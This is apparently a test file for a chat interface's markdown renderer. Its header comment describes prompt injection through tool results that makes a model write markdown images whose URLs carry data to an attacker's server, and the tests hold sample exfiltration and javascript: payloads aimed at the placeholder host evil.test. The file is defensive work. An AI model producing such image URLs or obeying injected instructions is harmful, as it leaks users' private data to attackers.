/**
 * What a model's answer may make the browser load by itself. An image loads while the answer streams, with no
 * click, so text injected through a tool result that makes the model write ![](https://attacker/?d=<data>)
 * sends that data out (EchoLeak, CamoLeak): only images of the person's own site load.
 */

import { test } from 'playwright/test'
import assert from 'node:assert/strict'
import { renderMarkdown } from '../../../ui/src/utils/markdown.ts'
import { SPA_CSP_DIRECTIVES } from '../../../api/src/spa-csp.ts'

const onSite = <T>(fn: () => T): T => {
  const g = globalThis as any
  const previous = g.location
  g.location = { origin: 'https://site.test' }
  try { return fn() } finally { g.location = previous }
}

test.describe('images in rendered answers', () => {
  test('an image of another site becomes a link, never an <img>', () => {
    const html = onSite(() => renderMarkdown('Done. ![status](https://evil.test/p.png?d=secret)'))
    assert.ok(!html.includes('<img'), html)
    assert.match(html, /<a href="https:\/\/evil\.test\/p\.png\?d=secret"[^>]*>status<\/a>/)
  })

  test('raw HTML, protocol-relative and srcset forms are caught too', () => {
    for (const md of [
      '<img src="https://evil.test/a.png">',
      '![x](//evil.test/a.png)',
      '<img src="/ok.png" srcset="https://evil.test/a.png 2x">'
    ]) {
      const html = onSite(() => renderMarkdown(md))
      assert.ok(!/<img[^>]*evil\.test/.test(html), `${md} → ${html}`)
      assert.ok(!html.includes('srcset'), `${md} → ${html}`)
    }
  })

  test('an image of the site itself is shown', () => {
    assert.match(onSite(() => renderMarkdown('![logo](/data-fair/logo.png)')), /<img src="\/data-fair\/logo\.png" alt="logo"/)
    assert.match(onSite(() => renderMarkdown('![t](https://site.test/thumb.png)')), /<img src="https:\/\/site\.test\/thumb\.png"/)
  })

  test('a link made from a javascript: image keeps no href', () => {
    const html = onSite(() => renderMarkdown('<img src="javascript:alert(1)" alt="x">'))
    assert.ok(!html.includes('javascript:'), html)
  })

  test('the chat page\'s CSP loads images from the site only', () => {
    const imgSrc = String(SPA_CSP_DIRECTIVES['img-src'])
    assert.ok(!/https:|\*/.test(imgSrc), imgSrc)
    assert.match(imgSrc, /'self'/)
    assert.match(String(SPA_CSP_DIRECTIVES['script-src']), /nonce/)
  })
})
